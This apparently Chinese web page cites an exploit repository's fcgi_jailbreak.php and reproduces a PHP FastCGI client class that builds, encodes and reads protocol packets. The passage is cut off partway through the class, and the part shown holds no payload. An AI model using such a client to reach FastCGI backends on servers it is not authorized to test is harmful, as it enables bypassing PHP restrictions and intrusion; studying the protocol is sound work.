<p>ä»£ç å‚è€ƒï¼š<a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */</span>
<span class="token comment">/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
 * @version     1.0
 */</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span>
<span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Socket
     * @var Resource
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Host
     * @var String
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Port
     * @var Integer
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Keep Alive
     * @var Boolean
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Create a connection to the FastCGI application
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>
            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">/* nameLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">/* valueLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">/* nameData &amp; valueData */</span>
        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Read a FastCGI Packet
     *
     * @return array
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */</span>
